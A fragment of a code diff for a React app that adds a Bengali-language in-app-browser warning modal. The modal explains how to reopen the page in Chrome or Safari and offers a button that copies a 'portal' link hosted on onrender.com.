+              <div className="bg-slate-900/60 border border-slate-800/80 rounded-2xl p-4 md:p-5 text-left space-y-4">
+                <h3 className="text-xs md:text-sm font-black text-emerald-400 border-b border-slate-800/80 pb-2 flex items-center gap-1.5">
+                  💡 ২ সেকেন্ডে ডিফল্ট ব্রাউজারে স্থানান্তরের উপায়:
+                </h3>
+                
+                <div className="space-y-3.5 text-xs md:text-[13px] text-slate-350">
+                  <div className="flex gap-3">
+                    <span className="bg-emerald-500/10 text-emerald-400 w-5 h-5 rounded-full font-black flex items-center justify-center shrink-0 border border-emerald-500/20 text-[10px]">১</span>
+                    <p className="leading-relaxed">
+                      মেসেঞ্জারের নিচে ডানে থ্রি-ডট <strong className="text-white">উইজেট (...)</strong> অথবা স্ক্রিনের উপরের ডান কোণায় থাকা থ্রি-ডট <strong className="text-white">(⋮)</strong> মেনুতে ক্লিক করুন।
+                    </p>
+                  </div>
+
+                  <div className="flex gap-3">
+                    <span className="bg-emerald-500/10 text-emerald-400 w-5 h-5 rounded-full font-black flex items-center justify-center shrink-0 border border-emerald-500/20 text-[10px]">২</span>
+                    <p className="leading-relaxed">
+                      তালিকা থেকে <strong className="text-emerald-300">"Open in System Browser"</strong> বা <strong className="text-emerald-300">"Safari-তে ওপেন করুন"</strong> অথবা <strong className="text-emerald-300">"Chrome এ ওপেন"</strong> অপশন টাইপ করুন।
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Action Buttons */}
+              <div className="flex flex-col gap-2.5 pt-2">
+                <button 
+                  onClick={() => {
+                    navigator.clipboard.writeText("https://amra-probashi3.onrender.com");
+                    setToast({ message: "লিংকটি সফলভাবে কপি করা হয়েছে! ক্রোম বা সাফারি ব্রাউজারে গিয়ে পেস্ট করুন।", type: "success" });
+                  }}
+                  className="bg-emerald-600 hover:bg-emerald-700 active:scale-[0.98] text-white py-3.5 px-6 rounded-xl font-bold text-xs md:text-sm flex items-center justify-center gap-2 transition-all shadow-lg shadow-emerald-950/55 cursor-pointer"
+                >
+                  <Copy size={16} /> অফিসিয়াল পোর্টাল লিংক কপি করুন
+                </button>
+
+                <div className="flex gap-2">
+                  <button 
+                    onClick={() => {
+                      setShowInAppWarning(false);
+                      setToast({ message: "ইন-অ্যাপ ব্রাউজারে প্রবেশ করেছেন! কিছু ফিচার বিঘ্নিত হতে পারে।", type: "error" });
+                    }}
+                    className="bg-slate-800/60 hover:bg-slate-800 text-slate-400 py-2.5 px-4 rounded-xl text-[10px] md:text-xs font-bold transition-all border border-slate-700/50 flex-1 cursor-pointer"
+                  >
+                    ইন-অ্যাপ এ চালিয়ে যান
+                  </button>
+                  <button 
+                    onClick={() => setShowInAppWarning(false)}
+                    className="bg-black/40 hover:bg-black/60 text-slate-500 py-2.5 px-4 rounded-xl text-[10px] md:text-xs font-semibold transition-all border border-slate-800/80 flex-1 cursor-pointer"
+                  >
+                    বন্ধ করুন
+                  </button>
+                </div>
+              </div>
+
+              <div className="text-[10px] text-slate-500">
+                Government Digital Services Portal Division &copy; 2026
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
       {renderContent()}
       <BottomNav activePage={activePage} setActivePage={setActivePage} />
       <AnimatePresence>{showAdmin && <AdminPanel onClose={() => setShowAdmin(false)} sendEmailNotification={sendEmailNotification} />}</AnimatePresence>
